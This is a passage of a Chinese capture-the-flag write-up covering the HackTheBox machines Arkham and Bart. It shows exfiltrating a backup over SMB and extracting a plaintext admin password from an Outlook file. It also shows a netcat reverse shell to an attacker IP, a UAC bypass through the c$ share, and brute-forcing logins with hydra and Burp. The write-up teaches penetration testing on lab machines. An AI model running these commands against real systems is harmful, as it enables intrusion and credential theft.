\u8fd9\u662f\u6307\u5b9a\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u8868\u793a\u8981\u5728 C:\\Users\\alfred \u76ee\u5f55\u4e0b\u8fdb\u884c\u641c\u7d22\u3002</p> <p>|: \u8fd9\u662f\u7ba1\u9053\u7b26\u53f7\uff0c\u7528\u4e8e\u5c06\u4e00\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u547d\u4ee4\u3002</p> <p>findstr: \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u641c\u7d22\u5b57\u7b26\u4e32\u3002</p> <p>/i: \u8fd9\u4e2a\u9009\u9879\u544a\u8bc9 findstr \u547d\u4ee4\u5728\u641c\u7d22\u65f6\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u3002</p> <p>/v: \u8fd9\u4e2a\u9009\u9879\u544a\u8bc9 findstr \u547d\u4ee4\u663e\u793a\u4e0d\u5339\u914d\u7684\u884c\u3002</p> <p>\"appdata\": \u8fd9\u662f\u8981\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0cfindstr \u5c06\u6392\u9664\u5305\u542b\u6b64\u5b57\u7b26\u4e32\u7684\u884c\u3002</p> <p>\u5728 C:\\Users\\alfred \u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u4e2d\uff0c\u5217\u51fa\u6240\u6709\u975e\u9690\u85cf\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4f46\u4e0d\u5305\u62ec\u9690\u85cf\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u540c\u65f6\u6392\u9664\u5305\u542b\u5b57\u7b26\u4e32 \"appdata\" \u7684\u884c\u3002</p> <p>\u53d1\u73b0 backup.zip\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u3002</p> <pre><code>C:\\&gt;net use \\\\10.10.14.11\\share\nSystem error 1272 has occurred.\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network. \n</code></pre> <p>\u501f\u52a9 smbserver \u6765\u5efa\u7acb smb \u5171\u4eab\uff0c\u540c\u65f6\u8bbe\u7f6e\u8d26\u53f7\u5bc6\u7801\uff0c\u5426\u5219\u65e0\u6cd5\u8fde\u63a5.</p> <pre><code>python3 smbserver.py -smb2support -username mac -password mac share .\nImpacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre> <p>smbserver.py:Impacket\u4e2d\u7684\u4e00\u4e2a\u5de5\u5177\u3002</p> <p>lmpacket\u6559\u7a0b\uff1ahttps://cloud.tencent.com/developer/article/1937036</p> <p>Impacket\u662f\u7528\u4e8e\u5904\u7406\u7f51\u7edc\u534f\u8bae\u7684Python\u7c7b\u7684\u96c6\u5408\uff0c\u7528\u4e8e\u5bf9SMB1-3\u6216IPv4 / IPv6 \u4e0a\u7684TCP\u3001UDP\u3001ICMP\u3001IGMP\uff0cARP\uff0cIPv4\uff0cIPv6\uff0cSMB\uff0cMSRPC\uff0cNTLM\uff0cKerberos\uff0cWMI\uff0cLDAP\u7b49\u534f\u8bae\u8fdb\u884c\u4f4e\u7ea7\u7f16\u7a0b\u8bbf\u95ee\u3002\u6570\u636e\u5305\u53ef\u4ee5\u4ece\u5934\u5f00\u59cb\u6784\u5efa\uff0c\u4e5f\u53ef\u4ee5\u4ece\u539f\u59cb\u6570\u636e\u4e2d\u89e3\u6790\uff0c\u800c\u9762\u5411\u5bf9\u8c61\u7684API\u4f7f\u5904\u7406\u534f\u8bae\u7684\u6df1\u5c42\u6b21\u7ed3\u6784\u53d8\u5f97\u7b80\u5355\u3002</p> <p>smbserver.py\uff1aSMB\u670d\u52a1\u5668\u7684Python\u5b9e\u73b0\uff0c\u5141\u8bb8\u5feb\u901f\u8bbe\u7f6e\u5171\u4eab\u548c\u7528\u6237\u5e10\u6237\u3002</p> <p>\u7136\u540e\u8fde\u63a5\uff1a</p> <pre><code>C:\\&gt;net use \\\\10.10.14.11\\share /u:mac mac\nThe command completed successfully.\n</code></pre> <p>\u5e76\u5c06\u6587\u4ef6\u590d\u5236\u5230\u6211\u7684 Kali \u4e2d\uff1a</p> <pre><code>copy C:\\Users\\Alfred\\Downloads\\backups\\backup.zip \\\\10.10.14.14\\share\\\n        1 file(s) copied.\n</code></pre> <p>\u89e3\u538b\u8be5\u6587\u4ef6\uff0c\u91cc\u9762\u5305\u542b\u4e00\u4e2a ost \u6587\u4ef6\uff0c\u662f Microsoft Outlook \u7684\u8131\u673a\u6587\u4ef6\u5939\u6587\u4ef6</p> <pre><code>root@kali# unzip -l backup.zip \nArchive:  backup.zip\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n 16818176  2019-02-02 18:00   alfred@arkham.local.ost\n---------                     -------\n 16818176                     1 file\n</code></pre> <p>readpst\u662f\u4e00\u4e2a\u4ece Linux \u89e3\u6790\u6587\u4ef6\u7684\u5de5\u5177\uff0c\u8be5\u5de5\u5177\u53ef\u4ee5\u7528\u6765\u89e3\u6790.pst\u3001.ost\u6587\u4ef6</p> <p>Outlook\u6570\u636e\u63d0\u53d6\u5de5\u5177readpst:Outlook\u662fWindows\u5e38\u7528\u7684\u90ae\u4ef6\u5ba2\u6237\u7aef\u3002\u5b83\u5c06\u7528\u6237\u7684\u4fe1\u606f\u4fdd\u5b58\u5230.pst\u6587\u4ef6\u4e2d\uff0c\u5982\u90ae\u4ef6\u3001\u7ea6\u4f1a\u3001\u65e5\u5386\u3001\u8054\u7cfb\u4eba\u7b49\u4fe1\u606f\u3002\u4e3a\u4e86\u4fbf\u4e8e\u67e5\u770b\u8fd9\u4e9b\u4fe1\u606f\uff0cKali Linux\u5185\u7f6e\u4e86\u4e00\u6b3e\u4e13\u7528\u5de5\u5177\u96c6readpst\u3002\u8be5\u5de5\u5177\u96c6\u53ef\u4ee5\u5c06.pst\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u63d0\u53d6\u4fdd\u5b58\u4e3a\u6587\u672c\u5f62\u5f0fmbox\u3002\u5728\u63d0\u53d6\u7684\u65f6\u5019\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6309\u7167\u90ae\u4ef6\u5185\u5bb9\uff0c\u5206\u76ee\u5f55\u8fdb\u884c\u4fdd\u5b58\u3002\u540c\u65f6\uff0c\u8be5\u5de5\u5177\u96c6\u8fd8\u53ef\u4ee5\u5c06\u6570\u636e\u5bfc\u51fa\u4e3aLDAP\u4e13\u7528\u7684.ldif\u683c\u5f0f\u548cSummation\u4e13\u7528\u7684DII\u683c\u5f0f\uff0c\u4fbf\u4e8e\u540e\u671f\u6570\u636e\u7684\u5206\u6790\u3002</p> <pre><code>root@kali# readpst alfred@arkham.local.ost \nOpening PST file and indexes...\nProcessing Folder \"Deleted Items\"\nProcessing Folder \"Inbox\"\nProcessing Folder \"Outbox\"\nProcessing Folder \"Sent Items\"\nProcessing Folder \"Calendar\"\nProcessing Folder \"Contacts\"\nProcessing Folder \"Conversation Action Settings\"\nProcessing Folder \"Drafts\"\nProcessing Folder \"Journal\"\nProcessing Folder \"Junk E-Mail\"\nProcessing Folder \"Notes\"\nProcessing Folder \"Tasks\"\nProcessing Folder \"Sync Issues\"\n        \"Inbox\" - 0 items done, 7 items skipped.\nProcessing Folder \"RSS Feeds\"\nProcessing Folder \"Quick Step Settings\"\n        \"alfred@arkham.local.ost\" - 15 items done, 0 items skipped.\n        \"Calendar\" - 0 items done, 3 items skipped.\nProcessing Folder \"Conflicts\"\nProcessing Folder \"Local Failures\"\nProcessing Folder \"Server Failures\"\n        \"Sync Issues\" - 3 items done, 0 items skipped.\n        \"Drafts\" - 1 items done, 0 items skipped.\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e94\u4e2a\u6587\u4ef6\uff0c\u4f46\u4ec5\u4e0d\u4e3a\u7a7a\uff1aDrafts.mbox</p> <pre><code>-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.calendar\n-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.contacts\n-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.journal\n-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.mbox\n-rwxrwx--- 1 root vboxsf 51857 Aug  7 02:03 Drafts.mbox\n</code></pre> <p>\u89e3\u538b\u5b8c\u6210\u662f\u4e00\u4e2a.mbox\u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u79cd\u7535\u5b50\u90ae\u4ef6\u90ae\u7bb1\u6587\u4ef6\u683c\u5f0f\uff0c\u53ef\u5728\u5355\u4e2a\u6587\u4ef6\u4e2d\u5b58\u50a8\u591a\u6761\u6d88\u606f\u5e76\u5c06\u5176\u4f5c\u4e3a\u6587\u672c\u3002\u4f7f\u7528 mutt \u6765\u6253\u5f00\u5b83.</p> <pre><code>mutt -R -f Drafts.mbox\n</code></pre> <p></p> <p>\u8fd9\u662f\u4e00\u5c01\u7ed9 batman \u7684\u90ae\u4ef6\uff0c\u7ffb\u5230\u6700\u540e\u5b58\u5728\u4e00\u4e2a\u9644\u4ef6</p> <p></p> <p>\u901a\u8fc7 v \u6765\u67e5\u770b\u9644\u4ef6</p> <p></p> <p></p> <p>\u6210\u529f\u83b7\u53d6\u5230\u8d26\u53f7\u5bc6\u7801\u4e3abatman/Zx^#QZX+T!123</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#shell_1","title":"\u83b7\u53d6shell","text":"<p>\u8fdb\u5165 powershell \u6765\u5236\u4f5c\u51ed\u636e</p> <pre><code>powershell\n$username = 'batman'\n$password = 'Zx^#QZX+T!123'\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword\n</code></pre> <pre><code>C:\\Users\\Alfred&gt;powershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Alfred&gt; $username = \"arkham\\batman\"\nPS C:\\Users\\Alfred&gt; $password = \"Zx^#QZX+T!123\"\nPS C:\\Users\\Alfred&gt; $secstr = New-Object -TypeName System.Security.SecureString\nPS C:\\Users\\Alfred&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}\nPS C:\\Users\\Alfred&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr\nPS C:\\Users\\Alfred&gt; new-pssession -computername . -credential $cred\n\n Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability\n -- ----            ------------    ------------    -----         -----------------     ------------\n  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available\n\n\nPS C:\\Users\\Alfred&gt; enter-pssession 1\n[localhost]: PS C:\\Users\\Batman\\Documents&gt; whoami\narkham\\batman\n[localhost]: PS C:\\Users\\Batman\\Documents&gt; \\windows\\System32\\spool\\drivers\\color\\n.exe -e cmd 10.10.14.11 443 \n</code></pre> <p>\u6210\u529f\u83b7\u5f97shell</p> <pre><code>root@kali# rlwrap nc -lnvp 443 \nNcat: Version 7.70 ( https://nmap.org/ncat )\nNcat: Listening on :::443\nNcat: Listening on 0.0.0.0:443\nNcat: Connection from 10.10.10.130.\nNcat: Connection from 10.10.10.130:49697.\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Batman\\Documents&gt;\n</code></pre>"},{"location":"CTF/HTB/Windows-Arkham/index.html#uac","title":"UAC\u7ed5\u8fc7","text":"<p>\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650</p> <pre><code>net user batman\n</code></pre> <pre><code>C:\\Users\\Batman\\Documents&gt;net user batman\nnet user batman\nUser name                    Batman\nFull Name\nComment\nUser's comment\nCountry/region code          001 (United States)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            2/3/2019 9:25:50 AM\nPassword expires             Never\nPassword changeable          2/3/2019 9:25:50 AM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   8/8/2019 12:45:38 AM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Administrators       *Remote Management Use\n                             *Users\nGlobal Group memberships     *None\nThe command completed successfully.\n</code></pre> <p>\u8be5\u7528\u6237\u62e5\u6709\u7ba1\u7406\u5458\u548c\u8fdc\u7a0b\u7ba1\u7406\u5458\u6743\u9650\uff0c\u4f46\u662f\u8bfb\u53d6 root.txt \u65f6\u65e0\u6cd5\u8bbf\u95ee administrator \u7684\u684c\u9762</p> <pre><code>dir c:\\Users\\administrator\\Desktop\ntype c:\\Users\\administrator\\Desktop\\root.txt\n</code></pre> <pre><code>PS C:\\Users\\Batman\\Documents&gt; type \\users\\administrator\\desktop\\root.txt\nAccess is denied\nAt line:1 char:1\n+ type \\users\\administrator\\desktop\\root.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (C:\\users\\administrator\\desktop\\root.txt:String) [Get-Content], UnauthorizedAccessException\n    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand\nCannot find path 'C:\\users\\administrator\\desktop\\root.txt' because it does not exist.\nAt line:1 char:1\n+ type \\users\\administrator\\desktop\\root.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (C:\\users\\administrator\\desktop\\root.txt:String) [Get-Content], ItemNotFoundException\n    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand\n</code></pre> <p>\u67e5\u8be2\u6743\u9650\uff0c\u5224\u65ad\u5f53\u524d\u73af\u5883\u4e3a\u53d7\u9650\u72b6\u6001\u4e14 UAC \u72b6\u6001\u5df2\u7ecf\u542f\u7528</p> <pre><code>PS C:\\Users\\Batman\\Documents&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State  \n============================= ============================== =======\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre> <p>\u901a\u8fc7\u672c\u5730\u5171\u4eab\u8bfb\u53d6root.txt</p> <pre><code>type \\\\localhost\\c$\\users\\administrator\\desktop\\root.txt\n</code></pre> <p></p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#_6","title":"\u603b\u7ed3","text":"<p>smb\u533f\u540d\u767b\u9646\u540e\u53d1\u73b0lucks\u955c\u50cf\uff0c\u6210\u529f\u7206\u7834lucks\u5bc6\u7801\u540e\u6302\u8f7d\u8be5\u955c\u50cf\uff0c\u5728\u5176\u4e2d\u67e5\u770b\u76f8\u5173\u914d\u7f6e\u4fe1\u606f\u3002\u7ad9\u70b9\u4e2d\u5b58\u5728JSF ViewState\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u867d\u7136\u6570\u636e\u662f\u52a0\u5bc6\u7684\uff0c\u4f46\u662f\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u653b\u51fb\u7684\u5bc6\u94a5\u4ece\u800c\u80fd\u591f\u6210\u529f\u83b7\u53d6\u7528\u6237\u6743\u9650\uff0c\u5728\u9776\u673a\u4e2d\u53d1\u73b0zip\u538b\u7f29\u6587\u4ef6\uff0c\u89e3\u538b\u540e\u662f\u4e00\u4e2ambox\u6587\u4ef6\uff0c\u6253\u5f00\u8be5\u90ae\u4ef6\u540e\u53d1\u73b0\u5176\u4e2d\u5b58\u50a8\u4e86\u7ba1\u7406\u5458\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u901a\u8fc7\u8be5\u8d26\u53f7\u5bc6\u7801\u501f\u52a9powershell\u4e0a\u7ebf\uff0c\u6210\u529f\u83b7\u53d6\u7ba1\u7406\u5458\u6743\u9650\uff0c\u4f46\u662f\u5176\u4e2d\u5b58\u5728UAC\u9650\u5236\uff0c\u6700\u7ec8\u53ef\u4f7f\u7528msf\u6216\u672c\u5730\u5171\u4eab\u7ed5\u8fc7UAC\u62ff\u5230flag\u3002</p>"},{"location":"CTF/HTB/Windows-Bart/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Bart/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.81 -oA scans/ports\n\u00b7\u00b7\u00b7\nPORT   STATE SERVICE\n80/tcp open  http\n\u00b7\u00b7\u00b7\nroot@kali# nmap -sT -sC -sV -O -p80 10.10.10.81 -oA scans/details\n...\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Did not follow redirect to http://forum.bart.htb/\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Bart/index.html#website-tcp-80","title":"Website - TCP 80","text":"<p>\u9700\u4fee\u6539 hosts \u6587\u4ef6\u901a\u8fc7\u7528\u57df\u540d\u8bbf\u95ee80\u7aef\u53e3</p> <pre><code>vim /etc/hosts\n10.10.10.81 forum.bart.htb bart.htb\n</code></pre> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":""},{"location":"CTF/HTB/Windows-Bart/index.html#forumbarthtb","title":"forum.bart.htb","text":"<pre><code>root@kali# gobuster -u http://forum.bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,asp,aspx,html\n=====================================================\n[+] Mode         : dir\n[+] Url/Domain   : http://forum.bart.htb/\n[+] Threads      : 10\n[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes : 204,301,302,307,200\n[+] Extensions   : .txt,.asp,.aspx,.html\n=====================================================\n/index.html (Status: 200)\n/Index.html (Status: 200)\n/INDEX.html (Status: 200)\n</code></pre> <p>\u6ca1\u6709\u627e\u5230\u53ef\u7528\u76ee\u5f55\u3002</p> <p>\u5207\u6362 wfuzz \u6765\u6d4b\u8bd5\u76ee\u5f55\u7ed3\u6784\uff0c\u4f46\u662f\u8fd8\u662f\u65e0\u679c\u3002</p> <pre><code>wfuzz -c -w /usr/share/wordlists/dirb/big.txt http://forum.bart.htb/FUZZ --hh 158607\n</code></pre>"},{"location":"CTF/HTB/Windows-Bart/index.html#barthtb","title":"bart.htb","text":"<pre><code>root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ\n...\n000067:  C=301      1 L       10 W          145 Ch        \"forum\"\n001614:  C=301      1 L       10 W          147 Ch        \"monitor\"\n002385:  C=301      1 L       10 W          145 Ch        \"Forum\"\n019837:  C=301      1 L       10 W          147 Ch        \"Monitor\"\n045240:  C=302      0 L        0 W            0 Ch        \"\"\n217693:  C=301      1 L       10 W          147 Ch        \"MONITOR\"\n000012:  C=302      0 L        0 W            0 Ch        \"# on atleast 2 different hosts\"\n000013:  C=302      0 L        0 W            0 Ch        \"#\"\n000014:  C=302      0 L        0 W            0 Ch        \"\"\n...\n</code></pre> <p>\u626b\u63cf\u7ed3\u679c\u663e\u793a\u5b58\u5728\u4e24\u4e2a\u8df3\u8f6c\u76ee\u5f55\uff1aforum \u548c monitor.</p> <p>\u5206\u522b\u8bbf\u95eehttp://bart.htb/forum\u548chttp://bart.htb/monitor</p> <p></p> <p></p> <p>forum \u76ee\u5f55\u9875\u9762\u4e0e forum \u5b50\u57df\u540d\u9875\u9762\u76f8\u540c\uff0c\u90a3\u4e48 monitor \u76ee\u5f55\u662f\u5426\u4e5f\u4e0e monitor \u5b50\u57df\u540d\u9875\u9762\u76f8\u540c\u5462\uff1f\u5e26\u7740\u8fd9\u4e2a\u7591\u95ee\u6211\u4eec\u5728 hosts \u6587\u4ef6\u4e2d\u6dfb\u52a0\u57df\u540d\u89e3\u6790.</p> <pre><code>vim /etc/hosts\n# HTB\u914d\u7f6e\n10.10.10.81 forum.bart.htb bart.htb monitor.bart.htb\n</code></pre> <p>\u6210\u529f\u8bbf\u95ee\uff0c\u8bf4\u660e\u731c\u6d4b\u6b63\u786e</p> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Bart/index.html#_3","title":"\u5bc6\u7801\u7206\u7834","text":"<p>\u5728 forum.bart.htb \u4e2d\u5b58\u5728\u4ee5\u4e0b\u7528\u6237\u4fe1\u606f\u3002\u5176\u4e2d\u53ea\u6709 Harvey Potter \u7684\u4fe1\u606f\u662f\u88ab\u6ce8\u91ca\u6389\u7684\uff0c\u56e0\u6b64\u5c06\u5176\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u5728\u76d1\u63a7\u767b\u9646\u754c\u9762\u5904\u7684\u627e\u56de\u5bc6\u7801\u6765\u8fdb\u884c\u7528\u6237\u540d\u679a\u4e3e\u3002\u5f53\u8f93\u5165\u9519\u8bef\u7684\u7528\u6237\u540d\u65f6\u51fa\u73b0\u754c\u9762\u5982\u4e0b</p> <p></p> <p>\u5f53\u8f93\u5165\u6b63\u786e\u7684\u7528\u6237\u540d\u65f6\uff0c\u51fa\u73b0email\u5df2\u53d1\u9001\u7684\u63d0\u793a\u4fe1\u606f</p> <p></p> <p>\u4f7f\u7528 cewl \u4ece\u7f51\u9875\u4e0a\u722c\u53d6\u5b57\u7b26\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u5b57\u5178</p> <pre><code>cewl -w cewl-forum.txt -e -a http://forum.bart.htb\nCeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)\n</code></pre> <p></p> <p>CEWL (Custom Word List Generator) \u662f Kali Linux \u4e0a\u7684\u4e00\u79cd\u5de5\u5177\uff0c\u7528\u4e8e\u751f\u6210\u5b9a\u5236\u7684\u5355\u8bcd\u5217\u8868\u3002CEWL \u662f\u4e00\u4e2a Ruby \u811a\u672c\uff0c\u80fd\u591f\u4ece\u76ee\u6807\u7f51\u7ad9\u6293\u53d6\u6587\u672c\u5185\u5bb9\u5e76\u521b\u5efa\u5355\u8bcd\u5217\u8868\uff0c\u901a\u5e38\u7528\u4e8e\u6e17\u900f\u6d4b\u8bd5\u548c\u5bc6\u7801\u7834\u89e3\u3002</p> <p>CEWL \u7684\u4e3b\u8981\u529f\u80fd\uff1a</p> <ul> <li> <p>\u7f51\u7ad9\u6293\u53d6\uff1a\u4ece\u76ee\u6807\u7f51\u7ad9\u6293\u53d6\u6587\u672c\u5185\u5bb9\uff0c\u5305\u62ec\u9875\u9762\u4e0a\u7684\u6240\u6709\u53ef\u89c1\u6587\u672c\u3002</p> </li> <li> <p>\u5355\u8bcd\u5217\u8868\u751f\u6210\uff1a\u6839\u636e\u6293\u53d6\u7684\u5185\u5bb9\u751f\u6210\u5355\u8bcd\u5217\u8868\uff0c\u8fd9\u4e9b\u5355\u8bcd\u5217\u8868\u53ef\u4ee5\u7528\u4e8e\u5b57\u5178\u653b\u51fb\u548c\u5bc6\u7801\u7834\u89e3\u3002</p> </li> <li> <p>\u7075\u6d3b\u6027\uff1a\u53ef\u4ee5\u6307\u5b9a\u6293\u53d6\u6df1\u5ea6\u3001\u6392\u9664\u7279\u5b9a\u7684\u6587\u4ef6\u7c7b\u578b\u3001\u4f7f\u7528\u4ee3\u7406\u7b49\u3002</p> </li> <li> <p>\u5143\u6570\u636e\u63d0\u53d6\uff1a\u53ef\u4ee5\u63d0\u53d6\u6587\u6863\u4e2d\u7684\u5143\u6570\u636e\uff08\u5982 PDF\u3001DOCX \u6587\u4ef6\uff09\u3002</p> </li> </ul> <p>\u4f7f\u7528 BurpSuite \u5bf9 harvey \u7528\u6237\u8fdb\u884c\u5bc6\u7801\u7206\u7834</p> <p></p> <p>\u5f97\u5230\u5bc6\u7801potter</p> <p>\u4f7f\u7528harvey/potter\u8fdb\u884c\u767b\u5f55\u76d1\u63a7\u754c\u9762</p> <p></p> <p>\u767b\u9646\u540e\u53d1\u73b0\u5b58\u5728\u53e6\u4e00\u4e2a\u5b50\u57df\u540d\uff1ainternal-01.bart.htb</p> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#website-internal-01barthtb","title":"website - internal-01.bart.htb","text":"<p>\u4fee\u6539 hosts \u6587\u4ef6\u5e76\u6dfb\u52a0\u65b0\u7684\u5b50\u57df\u540d</p> <pre><code>10.10.10.81 forum.bart.htb bart.htb monitor.bart.htb internal-01.bart.htb\n</code></pre> <p>\u8fd9\u4e2a\u7f51\u7ad9\u53ea\u63d0\u4f9b\u4e86\u4e00\u4e2a\u767b\u5f55\u9875\u9762\uff08\u8fd9\u662f\u4ece\u6839\u5230\u7684\u91cd\u5b9a\u5411\uff09\uff1ahttp://internal-01.bart.htb/simple_chat/login_form.php</p> <p></p> <p>\u76f4\u63a5\u518d\u8bd5\u8bd5harvey\u4ee5\u53capotter\uff0c\u53d1\u73b0\u8bf4\u5bc6\u7801\u5fc5\u987b\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e8.</p> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#gobuster","title":"gobuster","text":"<pre><code>root@kali# gobuster -u http://internal-01.bart.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php\n...\n/index.php (Status: 302)\n/log (Status: 301)\n/Index.php (Status: 302)\n/sql (Status: 301)\n/INDEX.php (Status: 302)\n/SQL (Status: 301)\n/Log (Status: 301)\n...\nroot@kali# gobuster -u http://internal-01.bart.htb/simple_chat -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html\n...\n/index.php (Status: 302)\n/login.php (Status: 302)\n/register.php (Status: 302)\n/media (Status: 301)\n/chat.php (Status: 302)\n/css (Status: 301)\n/includes (Status: 301)\n/Index.php (Status: 302)\n/Login.php (Status: 302)\n/js (Status: 301)\n/logout.php (Status: 302)\n/Media (Status: 301)\n/Register.php (Status: 302)\n/login_form.php (Status: 200)\n/Chat.php (Status: 302)\n/INDEX.php (Status: 302)\n/CSS (Status: 301)\n/JS (Status: 301)\n/Logout.php (Status: 302)\n/MEDIA (Status: 301)\n/Includes (Status: 301)\n...\n</code></pre> <p>\u9664\u4e86\u4e0b\u9762\u7684\u7206\u7834\u4ee5\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\u8fdb\u884c\u767b\u5f55\uff0c\u626b\u63cf simple_chat \u76ee\u5f55\u53ef\u53d1\u73b0\u5b58\u5728\u6ce8\u518c\u9875\u9762register.php\uff0c\u867d\u7136\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u8be5\u6587\u4ef6\u3002\u4f46\u662f\u6211\u4eec\u53ef\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u6ce8\u518c\u4e00\u4e2a\u65b0\u7528\u6237</p> <pre><code>curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d \"uname=mac&amp;passwd=password\"\n</code></pre> <p>\u4ee5mac/password\u540c\u6837\u80fd\u591f\u6210\u529f\u767b\u5f55\u7cfb\u7edf</p> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#hydra","title":"hydra","text":"<pre><code>hydra -l harvey -P /etc/wordlist/rockyou.txt -t 60 internal-01.bart.htb http-form-post \"/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login: Password\"\n</code></pre> <p>\u77e5\u9053\u5bc6\u7801\u662fPassword1</p> <p></p> <p>\u4f7f\u7528harvey/Password1\u767b\u5f55\u7cfb\u7edf</p> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#js","title":"js\u4ee3\u7801\u5206\u6790","text":"<p>\u767b\u5f55\u8fdb\u6765\u540e\uff0c\u5c1d\u8bd5\u70b9\u51fb\u5c4f\u5e55\u4e0a\u7684\u6309\u94ae\uff0c\u5f53\u70b9\u51fb\u5230Log\u6309\u94ae\u65f6\uff0c\u80fd\u53d1\u73b0\u4f1a\u5f39\u7a97\uff0c\u6211\u4eec\u5faa\u8ff9\u53bb\u627e\uff0c\u80fd\u53d1\u73b0\u8fd9\u4e2aLog\u6309\u94ae\u70b9\u51fb\u4e86\u8bdd\uff0c\u4f1a\u8bb0\u5f55\u4e0b\u6211\u4eec\u7684\u6d4f\u89c8\u5668\u4fe1\u606f\u3002</p> <p></p> <p>\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u53d1\u73b0\u5176\u4e2d\u5b58\u5728 javascript \u4ee3\u7801</p> <pre><code>function saveChat() {\n    // create a serialized object and send to log_chat.php. Once done hte XHR request, alert \"Done\"\n    var xhr = new XMLHttpRequest();\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState == XMLHttpRequest.DONE) {\n            alert(xhr.responseText);\n        }\n    }\n    xhr.open('GET', 